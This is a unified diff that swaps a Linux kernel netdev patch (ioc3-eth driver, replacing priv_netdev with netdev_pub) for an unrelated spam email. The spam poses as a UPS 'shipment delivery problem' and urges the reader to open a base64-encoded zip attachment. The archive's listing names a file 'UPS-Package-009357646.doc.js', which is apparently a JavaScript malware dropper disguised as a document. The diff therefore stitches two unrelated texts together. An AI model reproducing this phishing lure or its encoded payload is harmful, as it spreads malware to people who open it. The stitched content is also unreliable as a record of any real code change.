@@ -1,135 +1,64 @@
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Subject: [PATCH 2/2] ioc3-eth: use netdev_pub instead of handrolling alignment
-Date: Mon, 10 Jul 2017 05:19:59 +0200
-Message-ID: <20170710031959.7496-2-Jason@zx2c4.com>
-References: <20150612.142058.1085284048217032168.davem@davemloft.net>
- <20170710031959.7496-1-Jason@zx2c4.com>
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: davem@davemloft.net, netdev@vger.kernel.org,
-        linux-kernel@vger.kernel.org
+From: CGI-Mailer <cgi-mailer@kundenserver.de>
+Subject: Shipment delivery problem #009357646
+Date: Mon, 10 Jul 2017 05:28:49 +0200
+Message-ID: <0ZK6pk-1dmcoo0EEh-00szEX@infong316.kundenserver.de>
+Content-Type: multipart/mixed;
+        boundary="bound1_1121d762fedebac94a0c64af07f85742"
+Content-Transfer-Encoding: 8bit
+To: netdev@vger.kernel.org
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from frisell.zx2c4.com ([192.95.5.64]:54247 "EHLO frisell.zx2c4.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1753076AbdGJDUj (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Sun, 9 Jul 2017 23:20:39 -0400
-In-Reply-To: <20170710031959.7496-1-Jason@zx2c4.com>
+Received: from mout.kundenserver.de ([212.227.126.134]:54152 "EHLO
+        mout.kundenserver.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1753157AbdGJD2w (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sun, 9 Jul 2017 23:28:52 -0400
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-It's safer to use the generic library function for this, rather than
-reinventing it here with hard-coded alignment values.
+--bound1_1121d762fedebac94a0c64af07f85742
+Content-Type: text/plain; charset=us-ascii
 
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/net/ethernet/sgi/ioc3-eth.c | 11 +++--------
- 1 file changed, 3 insertions(+), 8 deletions(-)
+Dear Customer,
 
-diff --git a/drivers/net/ethernet/sgi/ioc3-eth.c b/drivers/net/ethernet/sgi/ioc3-eth.c
-index b607936e1b3e..514eca163ea5 100644
---- a/drivers/net/ethernet/sgi/ioc3-eth.c
-+++ b/drivers/net/ethernet/sgi/ioc3-eth.c
-@@ -86,31 +86,26 @@ struct ioc3_private {
- 	int tx_ci;			/* TX consumer index */
- 	int tx_pi;			/* TX producer index */
- 	int txqlen;
- 	u32 emcr, ehar_h, ehar_l;
- 	spinlock_t ioc3_lock;
- 	struct mii_if_info mii;
- 
- 	struct pci_dev *pdev;
- 
- 	/* Members used by autonegotiation  */
- 	struct timer_list ioc3_timer;
- };
- 
--static inline struct net_device *priv_netdev(struct ioc3_private *dev)
--{
--	return (void *)dev - ((sizeof(struct net_device) + 31) & ~31);
--}
--
- static int ioc3_ioctl(struct net_device *dev, struct ifreq *rq, int cmd);
- static void ioc3_set_multicast_list(struct net_device *dev);
- static int ioc3_start_xmit(struct sk_buff *skb, struct net_device *dev);
- static void ioc3_timeout(struct net_device *dev);
- static inline unsigned int ioc3_hash(const unsigned char *addr);
- static inline void ioc3_stop(struct ioc3_private *ip);
- static void ioc3_init(struct net_device *dev);
- 
- static const char ioc3_str[] = "IOC3 Ethernet";
- static const struct ethtool_ops ioc3_ethtool_ops;
- 
- /* We use this to acquire receive skb's that we can DMA directly into. */
- 
-@@ -417,39 +412,39 @@ static void ioc3_get_eaddr_nic(struct ioc3_private *ip)
- 		printk("Failed to read MAC address\n");
- 		return;
- 	}
- 
- 	/* Read Memory.  */
- 	nic_write_byte(ioc3, 0xf0);
- 	nic_write_byte(ioc3, 0x00);
- 	nic_write_byte(ioc3, 0x00);
- 
- 	for (i = 13; i >= 0; i--)
- 		nic[i] = nic_read_byte(ioc3);
- 
- 	for (i = 2; i < 8; i++)
--		priv_netdev(ip)->dev_addr[i - 2] = nic[i];
-+		netdev_pub(ip)->dev_addr[i - 2] = nic[i];
- }
- 
- /*
-  * Ok, this is hosed by design.  It's necessary to know what machine the
-  * NIC is in in order to know how to read the NIC address.  We also have
-  * to know if it's a PCI card or a NIC in on the node board ...
-  */
- static void ioc3_get_eaddr(struct ioc3_private *ip)
- {
- 	ioc3_get_eaddr_nic(ip);
- 
--	printk("Ethernet address is %pM.\n", priv_netdev(ip)->dev_addr);
-+	printk("Ethernet address is %pM.\n", netdev_pub(ip)->dev_addr);
- }
- 
- static void __ioc3_set_mac_address(struct net_device *dev)
- {
- 	struct ioc3_private *ip = netdev_priv(dev);
- 	struct ioc3 *ioc3 = ip->regs;
- 
- 	ioc3_w_emar_h((dev->dev_addr[5] <<  8) | dev->dev_addr[4]);
- 	ioc3_w_emar_l((dev->dev_addr[3] << 24) | (dev->dev_addr[2] << 16) |
- 	              (dev->dev_addr[1] <<  8) | dev->dev_addr[0]);
- }
- 
- static int ioc3_set_mac_address(struct net_device *dev, void *addr)
-@@ -780,27 +775,27 @@ static void ioc3_timer(unsigned long data)
- 	add_timer(&ip->ioc3_timer);
- }
- 
- /*
-  * Try to find a PHY.  There is no apparent relation between the MII addresses
-  * in the SGI documentation and what we find in reality, so we simply probe
-  * for the PHY.  It seems IOC3 PHYs usually live on address 31.  One of my
-  * onboard IOC3s has the special oddity that probing doesn't seem to find it
-  * yet the interface seems to work fine, so if probing fails we for now will
-  * simply default to PHY 31 instead of bailing out.
-  */
- static int ioc3_mii_init(struct ioc3_private *ip)
- {
--	struct net_device *dev = priv_netdev(ip);
-+	struct net_device *dev = netdev_pub(ip);
- 	int i, found = 0, res = 0;
- 	int ioc3_phy_workaround = 1;
- 	u16 word;
- 
- 	for (i = 0; i < 32; i++) {
- 		word = ioc3_mdio_read(dev, i, MII_PHYSID1);
- 
- 		if (word != 0xffff && word != 0x0000) {
- 			found = 1;
- 			break;			/* Found a PHY		*/
- 		}
- 	}
- 
--- 
-2.13.2
+Your item has arrived at the UPS Post Office at July 09, but the courier was unable to deliver parcel to you.
+
+Please check the attachment for complete details!
+
+Thank you for your assistance in this matter,
+ ,
+UPS Support Manager.
+
+
+--bound1_1121d762fedebac94a0c64af07f85742
+Content-Type: application/zip; name="UPS-Package-009357646.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Package-009357646.zip
+
+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
+
+
+--bound1_1121d762fedebac94a0c64af07f85742--
